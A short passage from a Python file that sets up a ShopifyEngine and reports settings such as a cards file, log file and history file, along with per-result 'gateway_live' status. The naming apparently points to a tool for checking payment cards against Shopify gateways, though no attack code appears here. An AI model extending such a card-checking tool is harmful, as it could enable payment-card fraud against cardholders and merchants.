            "bucket": result.get("bucket"),
            "gateway_live": result.get("gateway_live"),
            "detail": result.get("Detail"),
            "raw": result,
        }


engine = ShopifyEngine(runtime_store)


def module_env_summary() -> dict[str, Any]:
    """Values shown on the health/settings screens."""
    return {
        "cards_file": app_settings.cards_file,
        "log_file": app_settings.log_file,
        "history_file": app_settings.history_file,
        "pid": os.getpid(),
    }
